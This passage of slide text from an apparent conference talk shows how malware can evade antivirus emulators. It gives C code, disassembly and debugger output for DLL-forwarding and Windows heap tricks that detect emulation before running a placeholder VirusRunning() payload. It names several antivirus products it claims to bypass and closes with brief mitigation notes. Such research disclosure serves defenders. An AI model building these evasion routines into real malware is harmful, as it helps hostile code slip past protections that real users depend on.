EDI 00000000
EIP 004014AA bypasses. 
5) ;jump to ntdll gadget 
;.text:77EC96C5                 pop     edi
;.text:77EC96C6                 pop     esi
;.text:77EC96C7                 mov     eax, ebx
;.text:77EC96C9                 pop     ebx
;.text:77EC96CA                 retn
Simulate ROP ways to execute core code 
Bypass
• Kaspersky KIS2016
• Norman Suite 11
• Bitdefender Anti-virus2016 
• ESET Smart Seurity8
• VBA32 
• … 
As long as we can find a module which can not be loaded by AV-
Emulator. It can be leveraged to bypass AV-Emulators.
DEMO TIME
Advanced Exploitation Techniques
• DLL forwarding
• It is hard for AV-Emulator to do DLL forwarding 
because AV-Emulator typically scans import 
table or dynamically loads API to determine if 
an API can be called. 
• For now, the AV-Emulator is still not able to 
simulate indirect DLL forwarding.
Exploiting DLL Forwarding
• How to build a call?
URLDownloadToFile
1. We need to find a particular API which is not reported 
as risk by AV-Emulator.
2. The API from phase #1 can load URLMon.DLL indirectly.
• API HrSniffUrlForRfc822 meets the above requirement.
Exploiting DLL Forwarding
signed int __stdcall HrSniffUrlForRfc822(LPCWSTR ppwzMimeOut)
{
signed int v1; // edi@1
v1 = 1;
if ( FindMimeFromData(0, ppwzMimeOut, 0, 0, 0, 0, (LPWSTR *)&ppwzMimeOut, 0) >= 0 )
{
if ( !StrCmpW(ppwzMimeOut, L"message/rfc822") )
v1 = 0;
CoTaskMemFree((LPVOID)ppwzMimeOut);
}
return v1;
}
Exploiting DLL Forwarding
__stdcall CBody::Load(int, struct IMoniker *, struct IBindCtx *, unsigned long) ->
HrSniffUrlForRfc822(LPCWSTR ppwzMimeOut) ->              
FindMimeFromData(x,x,x,x,x,x,x,x) -> 
583D452D   8945 F8          MOV DWORD PTR SS:[EBP-8],EAX
583D4530   85D2             TEST EDX,EDX
583D4532   75 4D            JNZ SHORT inetcomm.583D4581
583D4534   52               PUSH EDX
583D4535   52               PUSH EDX
583D4536   53               PUSH EBX
583D4537   E8 15E5FFFF      CALL 
0012FEF8   58476EB0  皀GX   |FileName = "urlmon.dll"
0012FEFC   00000000  ....  |hFile = NULL
0012FF00   00000000  ....  \Flags = 0
0012FF04   00000001  ...
0012FF08   00000000  ....
Exploiting DLL Forwarding
• Bypass
• Kaspersky KIS2016
• Norman Suite 11
• Bitdefender Anti-virus2016 
• ESET Smart Seurity8
• VBA32 
• … 
Advanced Exploitation Techniques
• Heap allocation/free 
• Windows memory heap mechanism is very complicated, typically 
the AV-Emulator allocates chunks of memory pool to simulate 
memory operations of malicious program. 
• Taking advantage of windows heap feature, the information of 
heap structure is predictable, but AV-Emulator does not have 
such simulation. 
Exploiting Windows heap management mechanism
HLOCAL h1,h2,h3,h4,h5,h6; HANDLE hp;
hp = HeapCreate(0,0x1000,0); 
h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,32);
h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);                       free h2
HeapFree(hp,0,h1);
HeapFree(hp,0,h3);
HeapFree(hp,0,h2);
h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,60);
if (h4 == h1) {
printf("virurunning ...\n");
VirusRunning();}
Block ：16
Block ：32
Block：16
Block ：64
Exploiting Windows heap management mechanism
After freeing h2 block that heap size = 32,the heap manager will 
review if there is a free heap block nearby h2 first, if so, it 
will be merged into heap block that size is 64 ,rather than adding 
h2 into the Freelist. 
Therefore, when allocate heap block that size is 64, it would use 
the merged heap block directly. We can predict the case that h4 == 
h1. 
Bypass
• Norman Suite 11
• Bitdefender Anti-virus2016
• VBA32  \
• …
Exploiting Windows heap management mechanism
Furthermore, we modify the heap block pointer “Flink” 
and “Blink”. 
If do so, it would break the heap merging operation, lead 
to the failure of h4 allocation, but AV-Emulator does not 
simulate such behavior.
Exploiting Windows heap management mechanism
After freeing three heap blocks 
0:000> !heap -a 01460000            
Index   Address  Name      Debugging options enabled
6:   01460000 
Segment at 01460000 to 01470000 (00001000 bytes committed)
Flags:                00001002
Heap entries for Segment00 in Heap 01460000
01460000: 00000 . 00588 [101] - busy (587)
01460588: 00588 . 00240 [101] - busy (23f)
014607c8: 00240 . 00818 [100]
01460fe0: 00818 . 00020 [111] - busy (1d)
01461000:      0000f000      - uncommitted bytes.
Exploiting Windows heap management mechanism
Before Flink /Blink modification
0:000> !heap -x 014607c8            
Entry     User      Heap      Segment       Size  PrevSize
Unused    Flags
-----------------------------------------------------------------------------
014607c8  014607d0  01460000  01460000       818       240         0  free
Exploiting Windows heap management mechanism
After Flink ，Blink modification
0:000> !heap -x 014607c8
List corrupted: (Blink->Flink = 014600c4) != (Block = 014607d0)
HEAP 01460000 (Seg 01460000) At 014607c8 Error: block list entry corrupted
Entry     User      Heap      Segment       Size  PrevSize
Unused    Flags
-----------------------------------------------------------------------------
014607c8  014607d0  01460000  01460000       818       240         0  free
Exploiting Windows heap management mechanism
The heap manager would not be able to allocate new memory 
space to h4 anymore.
But the AV-Emulator do not have such feature, thus we can 
bypass the emulator as below:
Exploiting Windows heap management mechanism
HeapFree(hp,0,h1); 
HeapFree(hp,0,h3);  
HeapFree(hp,0,h2);
int diff = (16+8)+ (32+8) + (16+8);
int nlink = (int)h1 + diff;
*(int *)h1 = nlink;
*((int *)h1+1) = nlink;
h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,60); 
if (h4 == 0)
{
printf("virurunning ...\n");
VirusRunning();
} 
Exploiting Windows heap management mechanism
+0x0c4 FreeLists: _LIST_ENTRY [ 0x4f07d0 -
0x4f07d0 ]
004f07c8 13f806e1 00004631 004f00c4 004f00c4
004f07d8 41414141 41414141 04010005 0800467a
004f07e8 42424242 42424242 42424242 42424242
004f07f8 42424242 42424242 42424242 42424242
004f0808 fb0000fb 00004671 004f00c4 004f00c4
004f0818 43434343 43434343 f80000f8 0000467a
004f0828 004f00c4 004f07d0 00000000 00000000
HEAP
Offset 0xc4-FreeList
h1:0X14607D0
h3:0x1460828
Exploiting Windows heap management mechanism
+0x0c4 FreeLists: _LIST_ENTRY [ 0x4f07d0 -
0x4f07d0 ]
004f07c8 13f806e1 00004631 004f0828 004f0828
004f07d8 41414141 41414141 04010005 0800467a
004f07e8 42424242 42424242 42424242 42424242
004f07f8 42424242 42424242 42424242 42424242
004f0808 fb0000fb 00004671 004f00c4 004f00c4
004f0818 43434343 43434343 f80000f8 0000467a
004f0828 004f00c4 004f07d0 00000000 00000000
HEAP
Offset 0xc4-FreeList
h1:0X14607D0
h3:0x1460828
Exploiting Windows heap management mechanism
• Ntdll.RtlpAllocateHeap fails on memory allocation 
776a5f0d 8d4e08          lea     ecx,[esi+8]
776a5f10 8b39            mov     edi,dword ptr [ecx]
776a5f12 897db8          mov     dword ptr [ebp-48h],edi
776a5f15 8b560c          mov     edx,dword ptr [esi+0Ch]
776a5f18 895598          mov     dword ptr [ebp-68h],edx
776a5f1b 8b12            mov     edx,dword ptr [edx]
776a5f1d 8b7f04          mov     edi,dword ptr [edi+4]
776a5f20 3bd7            cmp
edx,edi
776a5f22 0f85674a0200    jne
ntdll!RtlpAllocateHeap+0x7a3 
Exploiting Windows heap management mechanism
• Ntdll.RtlpAllocateHeap fails on memory allocation.
if ( v47 == *(_DWORD *)(*(_DWORD *)v120 + 4) && v47 == v120 ){…
*(_DWORD *)(v44 + 120) -= v45;
*(_DWORD *)v22 = v67;         
} goto LABEL_78;
}
v94 = v47;
v93 = *(_DWORD *)(*(_DWORD *)v120 + 4);
v92 = v120;
v91 = v126;
LABEL_252:
RtlpLogHeapFailure(12, v91, v92, v93, v94, 0);
FreeList : Flink   Blink
free.Block: Flink  Blik
Exploiting Windows heap management mechanism
HeapFree(hp,0,h1); 
HeapFree(hp,0,h3);  
HeapFree(hp,0,h2);
int diff = (16+8)+ (32+8) + (16+8);
int nlink = (int)h1 + diff;
*(int *)h1 = nlink;
*((int *)h1+1) = nlink;
h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,60); 
if (h4 == 0)
{
printf("virurunning ...\n");
VirusRunning();
} 
Exploiting Windows heap management mechanism
If（h4 == 0） , we can bypass
• Kaspersky KIS2016
• Norman Suite 11
• Bitdefender Anti-virus2016 
• ESET Smart Seurity8 
• VBA32 
• …
Advanced Exploitation Techniques
•In fact, the bypass mechanism is quite 
simple, let's take a look at the code like 
this: 
Exploiting Windows heap management mechanism
hp = HeapCreate(0,0x1000,0x10000);
for (int i = 0 ; i < 10 ; i++)
{
h[i] = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
}
HeapFree(hp,0,h[0]); 
HeapFree(hp,0,h[2]); 
HeapFree(hp,0,h[4]); HLOCAL hfixed = h[4];
HLOCAL hx = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
if (hx == hfixed ) {
printf("virurunning ...\n");
VirusRunning(); }
Advanced Exploitation Techniques
• Life is tough, you can use a variety of tricks  
to distinguish AV-Emulator from real machine;
• Any predictable information of heap allocation/free
• Heap header information (After calling HeapFree)
• Heap list operations like add, delete ,and break
• Heapspray
…
Advanced Exploitation Techniques
• The examples of heap operations indicate:
• If we dig into any of the OS features, it probably can be used to bypass 
emulator.
• At present, it is difficult to build a sophisticated AV-Emulator that runs 
like real machine  
• We have opened Pandora box.
DEMO TIME
• Bypass Kaspersky KIS16.0.1.445zh-hans-cn_full.exe
• Other products End-point AV 
AV-Emulator Bypass Mitigation
• It is not easy for AV-Emulator to mitigate bypass 
because of lack of effective countermeasures. 
• Take more effort on depth of static heuristic 
analysis in order to avoid the problems of 
condition or branch. 
• In order to protect the internal detection logic 
of AV-Emulator, the emulator is supposed to 
reject a huge amount of scanning requests in a 
very short time.
Thank You! Q&&A
PI:EMAIL
http://www.vxjump.net
Thanks to Bing Sun gives me some cool ideas.
Thanks to Linxer talked about VM inside details with me.